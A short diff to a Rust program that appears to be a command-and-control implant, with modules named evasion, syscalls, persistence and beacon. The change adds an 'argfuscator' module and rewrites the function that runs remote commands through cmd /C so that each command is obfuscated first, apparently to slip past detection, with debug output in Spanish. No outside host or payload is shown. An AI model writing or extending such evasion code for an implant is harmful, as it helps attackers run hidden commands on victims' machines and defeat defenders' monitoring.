@@ -5,6 +5,7 @@ mod evasion;
 mod syscalls;
 mod persistence;
 mod beacon;
+mod argfuscator;
 
 #[cfg(target_os = "windows")]
 use std::ffi::CStr;
@@ -155,8 +156,12 @@ fn get_system_info(info_type: &str) -> String {
 }
 
 fn execute_command(command: &str) -> String {
-    println!("DEBUG: Ejecutando comando: {}", command);
-    let output = Command::new("cmd").args(&["/C", command]).output();
+    // Apply command obfuscation
+    let obfuscated_cmd = argfuscator::obfuscate(command);
+    println!("DEBUG: Comando original: {}", command);
+    println!("DEBUG: Comando ofuscado: {}", obfuscated_cmd);
+    
+    let output = Command::new("cmd").args(&["/C", &obfuscated_cmd]).output();
     match output {
         Ok(out) => {
             let stdout = String::from_utf8_lossy(&out.stdout);
